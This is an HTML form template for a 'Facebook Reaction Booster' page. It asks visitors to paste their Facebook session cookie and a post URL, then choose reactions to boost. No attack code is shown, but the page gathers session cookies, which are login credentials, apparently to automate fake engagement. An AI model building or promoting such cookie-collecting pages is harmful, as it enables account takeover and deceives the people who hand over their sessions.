<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Reaction Booster</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        input, button { padding: 10px; margin: 10px; width: 80%; }
    </style>
</head>
<body>

    <h1>Facebook Reaction Booster</h1>

    {% if error %}
        <p style="color: red;">{{ error }}</p>
    {% endif %}

    <form action="/" method="post">
        <input type="text" name="fb_cookie" placeholder="Enter Facebook Session Cookie" required><br>
        <input type="text" name="post_url" placeholder="Enter Facebook Post URL" required><br>

        <h3>Select Reactions:</h3>
        <label><input type="checkbox" name="reactions" value="like"> Like</label>
        <label><input type="checkbox" name="reactions" value="love"> Love</label>
        <label><input type="checkbox" name="reactions" value="care"> Care</label>
        <label><input type="checkbox" name="reactions" value="haha"> Haha</label>
        <label><input type="checkbox" name="reactions" value="wow"> Wow</label>
        <label><input type="checkbox" name="reactions" value="sad"> Sad</label>
        <label><input type="checkbox" name="reactions" value="angry"> Angry</label><br><br>

        <button type="submit">Boost Reactions</button>
    </form>

</body>
</html>
